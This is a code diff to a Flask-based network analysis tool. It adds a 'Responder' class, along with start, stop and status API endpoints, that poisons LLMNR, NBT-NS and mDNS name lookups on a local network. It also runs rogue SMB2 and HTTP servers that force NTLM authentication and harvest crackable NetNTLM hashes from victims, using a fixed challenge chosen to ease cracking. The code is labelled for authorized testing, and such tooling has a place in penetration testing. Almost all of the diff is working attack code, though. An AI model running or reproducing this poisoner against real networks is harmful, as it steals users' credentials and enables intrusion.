@@ -6938,10 +6938,539 @@ class ArpSweep:
                 self.finished_at = time.time()
 
 
+class Responder:
+    """Active credential capture — the offensive complement to Deadfall's passive
+    NTLM detection. Works like the open-source Responder tool:
+
+      1. Poisons name resolution. Listens on LLMNR (UDP 5355, mcast 224.0.0.252),
+         NBT-NS (UDP 137, broadcast) and mDNS (UDP 5353, mcast 224.0.0.251) and
+         answers every name query with OUR IP, so a victim looking up a mistyped
+         or non-existent host connects to us instead.
+      2. Stands up rogue auth servers on SMB (TCP 445) and HTTP (TCP 80) that
+         demand NTLM, issue a Type-2 challenge, and harvest the victim's Type-3
+         response — a hashcat-crackable NetNTLMv1/v2 hash.
+
+    Captured handshakes are fed straight into the live PcapAnalysis via
+    _ingest_ntlm(), so they appear in the same AD/hashes tab, findings, creds and
+    alert webhook as passively-sniffed hashes — no separate plumbing.
+
+    Needs raw/privileged sockets (root) and binds low ports, same footprint as
+    live capture. For authorized testing only."""
+
+    # Responder's well-known fixed server challenge — recognizable on the wire and
+    # lets NetNTLMv1 be cracked against precomputed (crack.sh) tables.
+    CHALLENGE = b"\x11\x22\x33\x44\x55\x66\x77\x88"
+    # NTLMSSP negotiate flags advertised in our Type-2 (unicode, NTLM, extended
+    # session security, target info, version, 128/56-bit) — drives clients to v2.
+    TYPE2_FLAGS = 0xA2898207
+    SPNEGO_OID = bytes([0x06, 0x06, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x02])
+    NTLMSSP_OID = bytes([0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a])
+
+    def __init__(self):
+        self.analysis = None
+        self.lock = threading.Lock()
+        self.running = False
+        self.iface = None
+        self.spoof_ip = None
+        self.target_name = "DEADFALL"
+        self.error = None
+        self.started_at = self.stopped_at = None
+        self._stop = threading.Event()
+        self._socks = []        # open sockets, closed on stop() to unblock threads
+        self._threads = []
+        self.enabled = {}       # listener -> True/err string
+        self.counts = {"LLMNR": 0, "NBT-NS": 0, "mDNS": 0, "SMB": 0, "HTTP": 0, "hashes": 0}
+        self.events = []        # recent (ts, kind, text) ring buffer for the UI
+
+    def configure(self, analysis):
+        self.analysis = analysis
+
+    # ---- status / logging ------------------------------------------------
+    def _log(self, kind, text):
+        with self.lock:
+            self.events.append({"ts": time.time(), "kind": kind, "text": text})
+            if len(self.events) > 200:
+                del self.events[:-200]
+
+    def status(self):
+        with self.lock:
+            return {
+                "running": self.running, "iface": self.iface, "spoof_ip": self.spoof_ip,
+                "target_name": self.target_name, "error": self.error,
+                "started_at": self.started_at, "stopped_at": self.stopped_at,
+                "listeners": dict(self.enabled), "counts": dict(self.counts),
+                "events": list(self.events[-40:]),
+                "hashes": self.counts.get("hashes", 0),
+            }
+
+    def _bump(self, key):
+        with self.lock:
+            self.counts[key] = self.counts.get(key, 0) + 1
+
+    # ---- lifecycle -------------------------------------------------------
+    def start(self, iface, spoof_ip=None, target_name=None,
+              listeners=("LLMNR", "NBT-NS", "mDNS", "SMB", "HTTP")):
+        if self.running:
+            return False, "responder already running"
+        if self.analysis is None:
+            return False, "no analysis context"
+        if not iface:
+            return False, "iface required"
+        if not spoof_ip:
+            try:
+                spoof_ip = get_if_addr(iface)
+            except Exception as e:
+                return False, f"could not read {iface} address: {e}"
+        if not spoof_ip or spoof_ip == "0.0.0.0":
+            return False, f"{iface} has no IPv4 address — specify spoof_ip"
+        try:
+            socket.inet_aton(spoof_ip)
+        except Exception:
+            return False, f"invalid spoof_ip: {spoof_ip}"
+
+        self._stop.clear()
+        with self.lock:
+            self.running = True
+            self.iface, self.spoof_ip = iface, spoof_ip
+            self.target_name = (target_name or "DEADFALL").strip()[:15] or "DEADFALL"
+            self.error = None
+            self.started_at, self.stopped_at = time.time(), None
+            self._socks, self._threads, self.enabled, self.events = [], [], {}, []
+            self.counts = {"LLMNR": 0, "NBT-NS": 0, "mDNS": 0, "SMB": 0, "HTTP": 0, "hashes": 0}
+
+        launchers = {
+            "LLMNR": lambda: self._udp_listener("LLMNR", 5355, "224.0.0.252", self._handle_dns_query),
+            "mDNS":  lambda: self._udp_listener("mDNS", 5353, "224.0.0.251", self._handle_dns_query),
+            "NBT-NS": lambda: self._udp_listener("NBT-NS", 137, None, self._handle_nbtns_query),
+            "SMB":   lambda: self._tcp_listener("SMB", 445, self._handle_smb_conn),
+            "HTTP":  lambda: self._tcp_listener("HTTP", 80, self._handle_http_conn),
+        }
+        for name in listeners:
+            fn = launchers.get(name)
+            if fn:
+                fn()
+        self._log("info", f"responder up on {iface} ({spoof_ip}), poisoning to {spoof_ip}")
+        return True, None
+
+    def stop(self):
+        self._stop.set()
+        with self.lock:
+            socks = list(self._socks)
+        for s in socks:
+            try:
+                s.close()
+            except Exception:
+                pass
+        with self.lock:
+            self.running = False
+            self.stopped_at = time.time()
+        self._log("info", "responder stopped")
+        return True, None
+
+    # ---- socket helpers --------------------------------------------------
+    def _udp_listener(self, name, port, mcast_group, handler):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            if hasattr(socket, "SO_REUSEPORT"):
+                try:
+                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
+                except OSError:
+                    pass
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+            s.bind(("", port))
+            if mcast_group:
+                mreq = socket.inet_aton(mcast_group) + socket.inet_aton(self.spoof_ip)
+                s.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
+            s.settimeout(1.0)
+        except Exception as e:
+            with self.lock:
+                self.enabled[name] = f"bind failed: {e}"
+            self._log("error", f"{name} listener failed: {e}")
+            return
+        with self.lock:
+            self.enabled[name] = True
+            self._socks.append(s)
+        t = threading.Thread(target=self._udp_loop, args=(name, s, handler),
+                             name=f"resp-{name}", daemon=True)
+        t.start()
+        with self.lock:
+            self._threads.append(t)
+
+    def _udp_loop(self, name, sock, handler):
+        while not self._stop.is_set():
+            try:
+                data, addr = sock.recvfrom(65535)
+            except socket.timeout:
+                continue
+            except OSError:
+                break
+            try:
+                reply = handler(name, data, addr)
+                if reply:
+                    sock.sendto(reply, addr)
+                    self._bump(name)
+            except Exception:
+                pass
+
+    def _tcp_listener(self, name, port, handler):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.bind(("", port))
+            s.listen(64)
+            s.settimeout(1.0)
+        except Exception as e:
+            with self.lock:
+                self.enabled[name] = f"bind failed: {e}"
+            self._log("error", f"{name} listener failed: {e}")
+            return
+        with self.lock:
+            self.enabled[name] = True
+            self._socks.append(s)
+        t = threading.Thread(target=self._accept_loop, args=(name, s, handler),
+                             name=f"resp-{name}", daemon=True)
+        t.start()
+        with self.lock:
+            self._threads.append(t)
+
+    def _accept_loop(self, name, sock, handler):
+        while not self._stop.is_set():
+            try:
+                conn, addr = sock.accept()
+            except socket.timeout:
+                continue
+            except OSError:
+                break
+            ct = threading.Thread(target=self._serve_conn, args=(name, conn, addr, handler),
+                                 name=f"resp-{name}-conn", daemon=True)
+            ct.start()
+
+    def _serve_conn(self, name, conn, addr, handler):
+        conn.settimeout(8.0)
+        try:
+            handler(conn, addr)
+        except Exception:
+            pass
+        finally:
+            try:
+                conn.close()
+            except Exception:
+                pass
+
+    # ---- NTLM Type-2 + SPNEGO --------------------------------------------
+    @staticmethod
+    def _der_len(n):
+        if n < 0x80:
+            return bytes([n])
+        out = b""
+        while n:
+            out = bytes([n & 0xFF]) + out
+            n >>= 8
+        return bytes([0x80 | len(out)]) + out
+
+    @classmethod
+    def _der(cls, tag, content):
+        return bytes([tag]) + cls._der_len(len(content)) + content
+
+    def _ntlm_type2(self):
+        """Build a raw NTLMSSP Type-2 (CHALLENGE) message carrying our fixed
+        server challenge and a target-info block (drives clients to NetNTLMv2)."""
+        tn = self.target_name.encode("utf-16-le")
+
+        def av(t, v):
+            return struct.pack("<HH", t, len(v)) + v
+
+        target_info = av(2, tn) + av(1, tn) + av(4, tn) + av(3, tn) + struct.pack("<HH", 0, 0)
+        sig = b"NTLMSSP\x00" + struct.pack("<I", 2)
+        tn_off = 56
+        ti_off = tn_off + len(tn)
+        msg = (
+            sig
+            + struct.pack("<HHI", len(tn), len(tn), tn_off)        # TargetName SecBuf
+            + struct.pack("<I", self.TYPE2_FLAGS)                  # NegotiateFlags
+            + self.CHALLENGE                                       # ServerChallenge (offset 24)
+            + b"\x00" * 8                                          # Reserved
+            + struct.pack("<HHI", len(target_info), len(target_info), ti_off)  # TargetInfo SecBuf
+            + b"\x06\x01\xb1\x1d\x00\x00\x00\x0f"                  # Version
+            + tn + target_info
+        )
+        return msg
+
+    def _spnego_type2(self, ntlm_type2):
+        """Wrap a Type-2 in a SPNEGO NegTokenResp (accept-incomplete) — the form
+        SMB/HTTP clients expect inside the GSS security blob."""
+        resp_token = self._der(0xA2, self._der(0x04, ntlm_type2))
+        neg_state = bytes([0xA0, 0x03, 0x0A, 0x01, 0x01])
+        return self._der(0xA1, self._der(0x30, neg_state + resp_token))
+
+    def _spnego_init(self):
+        """SPNEGO NegTokenInit advertising NTLMSSP — the security blob in our SMB2
+        NEGOTIATE response. Server-side NegTokenInit lists mechTypes only; the
+        Type-2 challenge is delivered later in the SESSION_SETUP response."""
+        mech_types = self._der(0xA0, self._der(0x30, self.NTLMSSP_OID))
+        inner = self._der(0x30, mech_types)
+        return self._der(0x60, self.SPNEGO_OID + self._der(0xA0, inner))
+
+    def _capture(self, client_ip, client_port, proto, server_port, type3_blob):
+        """Feed a captured Type-3 (plus the Type-2 we issued) into the analysis so
+        the assembled NetNTLM hash lands in the AD/hashes tab, findings and alerts."""
+        a = self.analysis
+        if a is None:
+            return
+        type2 = self._ntlm_type2()
+        ck = a._conn_key(client_ip, client_port, self.spoof_ip, server_port)
+        try:
+            with a.lock:
+                before = len(a.ntlm_hashes)
+                # Seed the challenge cache with our Type-2, then assemble from Type-3.
+                a._ingest_ntlm(ck, self.spoof_ip, client_ip, server_port, proto, type2)
+                a._ingest_ntlm(ck, client_ip, self.spoof_ip, server_port, proto, type3_blob)
+                gained = len(a.ntlm_hashes) - before
+                newest = a.ntlm_hashes[-1] if a.ntlm_hashes else None
+        except Exception:
+            return
+        if gained > 0 and newest:
+            self._bump("hashes")
+            self._log("hash", f"{newest['type']} {newest.get('domain','')}\\"
+                              f"{newest.get('user','')} via {proto} from {client_ip}")
+
+    # ---- name-resolution poisoners ---------------------------------------
+    def _build_dns_answer(self, data, ttl=30, mdns=False):
+        """Craft a DNS/LLMNR/mDNS response to a query, answering the first A
+        question with our spoof IP. Returns None if it isn't a poisonable query."""
+        if len(data) < 12:
+            return None
+        tid = data[0:2]
+        flags = struct.unpack(">H", data[2:4])[0]
+        qd = struct.unpack(">H", data[4:6])[0]
+        if (flags & 0x8000) or qd < 1:          # ignore responses; need a question
+            return None
+        # Walk the first question's name.
+        off = 12
+        while off < len(data):
+            ln = data[off]
+            if ln == 0:
+                off += 1
+                break
+            if ln & 0xC0:                        # compression pointer — bail
+                off += 2
+                break
+            off += 1 + ln
+        if off + 4 > len(data):
+            return None
+        qtype, qclass = struct.unpack(">HH", data[off:off + 4])
+        if qtype not in (1, 255):                # A (or ANY); skip AAAA/SRV/etc.
+            return None
+        question = data[12:off + 4]
+        name = self._dns_qname(data)
+        # Header: QR=1, AA=1 (+ RA for LLMNR), 1 question echoed, 1 answer.
+        resp_flags = 0x8400 if mdns else 0x8580
+        header = tid + struct.pack(">HHHHH", resp_flags, 1, 1, 0, 0)
+        ans_class = 0x8001 if mdns else 0x0001   # mDNS sets cache-flush bit
+        answer = (b"\xc0\x0c"                     # pointer to the question name
+                  + struct.pack(">HHI", 1, ans_class, ttl)
+                  + struct.pack(">H", 4) + socket.inet_aton(self.spoof_ip))
+        self._log("poison", f"answered {name or '?'} -> {self.spoof_ip}")
+        return header + question + answer, name
+
+    @staticmethod
+    def _dns_qname(data):
+        off, labels = 12, []
+        while off < len(data):
+            ln = data[off]
+            if ln == 0 or (ln & 0xC0):
+                break
+            labels.append(data[off + 1:off + 1 + ln].decode("ascii", "replace"))
+            off += 1 + ln
+        return ".".join(labels)
+
+    def _handle_dns_query(self, name, data, addr):
+        mdns = (name == "mDNS")
+        built = self._build_dns_answer(data, mdns=mdns)
+        return built[0] if built else None
+
+    @staticmethod
+    def _nbt_decode(enc):
+        try:
+            dec = bytes(((enc[i] - 0x41) << 4) | (enc[i + 1] - 0x41)
+                        for i in range(0, 32, 2))
+            return dec.rstrip(b"\x00 ").decode("ascii", "replace")
+        except Exception:
+            return ""
+
+    def _handle_nbtns_query(self, name, data, addr):
+        """Answer an NBT-NS name query with a positive name-query response."""
+        if len(data) < 50:
+            return None
+        flags = struct.unpack(">H", data[2:4])[0]
+        if flags & 0x8000:                       # already a response
+            return None
+        # Question name is 0x20, 32 encoded bytes, 0x00 terminator -> 34 bytes.
+        if data[12] != 0x20:
+            return None
+        decoded = self._nbt_decode(data[13:45])
+        if decoded in ("", "*", "\x01\x02__MSBROWSE__\x02"):
+            return None
+        question = data[12:50]                   # name(34) + type(2) + class(2)
+        tid = data[0:2]
+        header = tid + struct.pack(">HHHHH", 0x8500, 0, 1, 0, 0)
+        # Answer: name + NB-type + class + TTL + RDLEN(6) + NB-flags + IP.
+        ans = question + struct.pack(">IH", 165, 6) + b"\x00\x00" + socket.inet_aton(self.spoof_ip)
+        self._log("poison", f"answered NBT {decoded} -> {self.spoof_ip}")
+        return header + ans
+
+    # ---- rogue HTTP server ----------------------------------------------
+    def _handle_http_conn(self, conn, addr):
+        """Force NTLM auth on every request and harvest the Type-3 from the
+        Authorization header (WPAD, intranet, proxy-auth victims)."""
+        client_ip, client_port = addr
+        type2_b64 = base64.b64encode(self._ntlm_type2()).decode()
+        while not self._stop.is_set():
+            req = self._recv_http(conn)
+            if not req:
+                return
+            self._bump("HTTP")
+            text = req.decode("latin1", "replace")
+            m = re.search(r"(?im)^(?:Authorization|Proxy-Authorization):\s*"
+                          r"(?:NTLM|Negotiate)\s+([A-Za-z0-9+/=]+)", text)
+            blob = None
+            if m:
+                try:
+                    blob = base64.b64decode(m.group(1), validate=False)
+                except Exception:
+                    blob = None
+            if blob and b"NTLMSSP\x00" in blob:
+                i = blob.find(b"NTLMSSP\x00")
+                mtype = struct.unpack_from("<I", blob, i + 8)[0] if len(blob) >= i + 12 else 0
+                if mtype == 3:
+                    self._capture(client_ip, client_port, "HTTP", 80, blob[i:])
+                    body = b"<html><body>Authenticated.</body></html>"
+                    conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: %d\r\n"
+                                 b"Connection: close\r\n\r\n%s" % (len(body), body))
+                    return
+                if mtype == 1:
+                    chal = b"HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM %s\r\n" \
+                           b"Content-Length: 0\r\n\r\n" % type2_b64.encode()
+                    conn.sendall(chal)
+                    continue
+            # No/incomplete auth yet -> demand NTLM.
+            conn.sendall(b"HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM\r\n"
+                         b"Content-Length: 0\r\n\r\n")
+
+    @staticmethod
+    def _recv_http(conn):
+        buf = b""
+        while b"\r\n\r\n" not in buf:
+            try:
+                chunk = conn.recv(4096)
+            except Exception:
+                return None
+            if not chunk:
+                return None
+            buf += chunk
+            if len(buf) > 65536:
+                break
+        return buf
+
+    # ---- rogue SMB2 server ----------------------------------------------
+    @staticmethod
+    def _recv_nbss(conn):
+        """Read one NetBIOS-Session-framed message (4-byte length prefix)."""
+        hdr = Responder._recv_n(conn, 4)
+        if not hdr:
+            return None
+        length = struct.unpack(">I", hdr)[0] & 0xFFFFFF
+        if length == 0 or length > 16 * 1024 * 1024:
+            return None
+        return Responder._recv_n(conn, length)
+
+    @staticmethod
+    def _recv_n(conn, n):
+        buf = b""
+        while len(buf) < n:
+            try:
+                chunk = conn.recv(n - len(buf))
+            except Exception:
+                return None
+            if not chunk:
+                return None
+            buf += chunk
+        return buf
+
+    @staticmethod
+    def _nbss(payload):
+        return struct.pack(">I", len(payload)) + payload
+
+    def _smb2_header(self, command, message_id, session_id, status=0, credit=1):
+        return struct.pack("<4sHHIHHIIQII Q16s".replace(" ", ""),
+                           b"\xfeSMB", 64, 0, status, command, credit,
+                           0x00000001,            # SMB2_FLAGS_SERVER_TO_REDIR
+                           0, message_id, 0, 0, session_id, b"\x00" * 16)
+
+    def _smb2_negotiate_response(self, mid, sid, dialect):
+        blob = self._spnego_init()
+        sec_off = 64 + 64                          # SMB2 header + fixed negotiate body
+        body = (struct.pack("<HHHH", 65, 0x01, dialect, 0)   # size, signing-enabled, dialect, ctxcount
+                + b"\x00" * 16                                # ServerGuid
+                + struct.pack("<I", 0)                        # Capabilities
+                + struct.pack("<III", 0x100000, 0x100000, 0x100000)  # max trans/read/write
+                + b"\x00" * 16                                # SystemTime + ServerStartTime
+                + struct.pack("<HHI", sec_off, len(blob), 0)  # SecBuf off/len, NegContextOffset
+                + blob)
+        return self._smb2_header(0x0000, mid, sid) + body
+
+    def _smb2_session_setup_response(self, mid, sid, sec_blob, status):
+        sec_off = 64 + 8
+        body = struct.pack("<HHHH", 9, 0, sec_off, len(sec_blob)) + sec_blob
+        return self._smb2_header(0x0001, mid, sid, status=status) + body
+
+    def _handle_smb_conn(self, conn, addr):
+        client_ip, client_port = addr
+        STATUS_MORE = 0xC0000016
+        STATUS_DENIED = 0xC0000022
+        assigned_sid = 0x0000000000004141
+        while not self._stop.is_set():
+            msg = self._recv_nbss(conn)
+            if not msg or len(msg) < 4:
+                return
+            self._bump("SMB")
+            # Legacy SMB1 multi-protocol negotiate -> upgrade to SMB2 (wildcard 0x02FF).
+            if msg[:4] == b"\xffSMB":
+                resp = self._smb2_negotiate_response(0, 0, 0x02FF)
+                conn.sendall(self._nbss(resp))
+                continue
+            if msg[:4] != b"\xfeSMB" or len(msg) < 64:
+                return
+            command = struct.unpack_from("<H", msg, 12)[0]
+            mid = struct.unpack_from("<Q", msg, 24)[0]
+            sid = struct.unpack_from("<Q", msg, 40)[0]
+            if command == 0x0000:                  # NEGOTIATE
+                conn.sendall(self._nbss(self._smb2_negotiate_response(mid, 0, 0x0202)))
+                continue
+            if command == 0x0001:                  # SESSION_SETUP
+                i = msg.find(b"NTLMSSP\x00")
+                mtype = struct.unpack_from("<I", msg, i + 8)[0] if (i >= 0 and len(msg) >= i + 12) else 0
+                if mtype == 1:
+                    blob = self._spnego_type2(self._ntlm_type2())
+                    resp = self._smb2_session_setup_response(mid, assigned_sid, blob, STATUS_MORE)
+                    conn.sendall(self._nbss(resp))
+                    continue
+                if mtype == 3:
+                    self._capture(client_ip, client_port, "SMB", 445, msg[i:])
+                    resp = self._smb2_session_setup_response(mid, sid or assigned_sid, b"", STATUS_DENIED)
+                    conn.sendall(self._nbss(resp))
+                    return
+                return
+            # Anything else (tree connect, etc.) before auth -> drop.
+            return
+
+
 analysis = None
 whois_cache = WhoisCache()
 live_capture = LiveCapture()
 arp_sweep = ArpSweep()
+responder = Responder()
 
 
 @app.route("/")
@@ -7276,6 +7805,37 @@ def api_arp_sweep_start():
 @app.route("/api/arp-sweep/status")
 def api_arp_sweep_status():
     return jsonify(arp_sweep.status())
+
+
+@app.route("/api/responder/start", methods=["POST"])
+def api_responder_start():
+    """Start the Responder-style poisoner + rogue NTLM servers. Captured hashes
+    flow into the same AD/hashes tab and alert webhook as passive captures."""
+    if analysis is None:
+        return jsonify({"error": "no analysis context"}), 400
+    data = request.get_json(silent=True) or {}
+    iface = (data.get("iface") or live_capture.iface or "").strip()
+    spoof_ip = (data.get("spoof_ip") or "").strip() or None
+    target_name = (data.get("target_name") or "").strip() or None
+    listeners = data.get("listeners") or ["LLMNR", "NBT-NS", "mDNS", "SMB", "HTTP"]
+    if not iface:
+        return jsonify({"error": "iface required"}), 400
+    responder.configure(analysis)
+    ok, err = responder.start(iface, spoof_ip, target_name, tuple(listeners))
+    if not ok:
+        return jsonify({"error": err, **responder.status()}), 400
+    return jsonify(responder.status())
+
+
+@app.route("/api/responder/stop", methods=["POST"])
+def api_responder_stop():
+    responder.stop()
+    return jsonify(responder.status())
+
+
+@app.route("/api/responder/status")
+def api_responder_status():
+    return jsonify(responder.status())
 
 
 @app.route("/api/live/start", methods=["POST"])
